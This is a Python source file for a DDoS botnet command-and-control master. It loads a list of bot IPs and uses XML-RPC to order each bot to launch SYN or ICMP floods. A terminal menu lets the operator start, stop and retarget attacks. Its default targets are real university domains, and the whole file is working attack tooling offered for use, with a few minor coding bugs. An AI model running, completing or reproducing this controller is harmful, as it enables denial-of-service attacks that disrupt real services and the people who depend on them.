"""
message_format = {
    "type": "attack", # "attack" or "stop"
    "target_ip": "0.0.0.0",
    "attack_type": "icmp", "icmp" or "syn"
    "number_of_attack": 1
}
"""
import copy
import random
import xmlrpc.client
import os
import threading
import socket


class CommandRunner(threading.Thread):
    def __init__(self, ip, message):
        threading.Thread.__init__(self)
        self.ip = ip
        self.message = message

    def run(self):
        # print("AAA")
        s = xmlrpc.client.ServerProxy("http://"+self.ip+":5000")
        # print(s.system.listMethods())
        s.give_command(self.message)


class DDoSMaster:
    def __init__(self):
        # self.p = Pool(2)
        self.botnets = self.getBotNetList()
        self.message = {
            "type": "attack",  # "attack" or "stop"
            "target_ip": ["igracias.telkomuniversity.ac.id", "telkomuniversity.ac.id"],
            "attack_type": "syn",
            "number_of_attack": 1000
        }
        self.bot_thread = []
        self.log = []

    def distributeCommand(self):
        """distributing command that has been build to botnet"""
        n_targets = len(self.message["target_ip"])
        for bot in self.botnets:
            target_idx = random.randint(0, n_targets-1)
            if self.message["type"] == "attack":
                print(bot + " --attacking--> " +
                      self.message["target_ip"][target_idx])
            elif self.message["type"] == "stop":
                print(bot + " --stop attacking--X " +
                      self.message["target_ip"][target_idx])
            try:
                message_to_botnet = copy.deepcopy(self.message)
                message_to_botnet["target_ip"] = self.message["target_ip"][target_idx]
                current = CommandRunner(bot, message_to_botnet)
                self.bot_thread.append(current)
                current.start()
            except ConnectionRefusedError:
                print("BotNet died! IP: ", bot)

    def buildAttack(self):
        """prepare the message attack that will send to botnet"""
        self.message["type"] = "attack"
        self.distributeCommand()

    def stopAttack(self):
        """stop attack to the target server"""
        self.message["type"] = "stop"
        self.distributeCommand()

    def getBotNetList(self):
        """view all list of available botnet"""
        ip_list = []
        with open("botnet_list.txt", "r") as file:
            ip_list = file.readlines()
            ip_list = [x.strip() for x in ip_list]
        return list(set(ip_list))

    def parseMenu(self, menu):
        if menu == "1":
            # print("!")
            self.buildAttack()
            print("Press Enter to skip... You can see in log menu")
            input()
            # self.distributeCommand(self.message)
        elif menu == "2":
            self.botnets = self.getBotNetList()
            print("*** BotNet List ***")
            print(self.botnets)
            print("Press Enter to back...")
            input()
        elif menu == "3":
            self.botnets = self.getBotNetList()
            self.stopAttack()
        elif menu == "4":
            # print("Insert Target IP: ", end="")
            print("If you have more than 1 target, just separate by comma")
            target_ip = str(input("Insert Target IP: "))
            print("\nAttack Type Available: icmp or syn")
            attack_type = str(input("Insert Attack Type: "))
            print()
            number_of_attack = str(input("Insert Amount of Attack Packet: "))
            self.changeAttack(target_ip, attack_type, number_of_attack)
        elif menu == "5":
            self.viewAttackOption()
        elif menu == "6":
            self.showLog()
            print("Press Enter to back...")
            input()

    def stopThread(self, ip):
        for bot in self.bot_thread:
            if bot.ip == ip:
                bot._stop()
                break

    def showLog(self):
        f = open("log.txt", "r")
        for line in f:
            print(line, end="")
        f.close()

    def changeAttack(self, ip_target, attack_type, number_of_attack):
        self.message["target_ip"] = ip_target.split(",")
        if len(self.message["target_ip"]) == 1:
            list_targets = []
            list.append(self.message["target_ip"])
            self.message["target_ip"] = list_targets
        self.message["attack_type"] = attack_type.split(",")
        self.message["number_of_attack"] = number_of_attack

    def viewAttackOption(self):
        print("Target IP(s): " + str(self.message["target_ip"]))
        print("Attack Type(s): " + str(self.message["attack_type"]))
        print("Number of Packet: " + str(self.message["number_of_attack"]))
        print("Press Enter to back...")
        input()


def getMasterIpAddress():
    return socket.gethostbyname(socket.gethostname())


if __name__ == '__main__':
    this_ip = getMasterIpAddress()
    ddos = DDoSMaster()
    menu = 0
    while menu != 99:
        os.system("cls")
        print("========== Welcome to DDoS Attack Application! ==========")
        print("Your IP Address: ", this_ip)
        # ddos.parseMenu(menu)
        print("1. Attack Target")
        print("2. View Botnet List")
        print("3. Stop Attack")
        print("4. Change Attack Option")
        print("5. View Attack Option")
        print("6. View Log")
        print("Select: ", end="")
        menu = str(input())
        os.system("cls")
        ddos.parseMenu(menu)
        # os.system("cls")
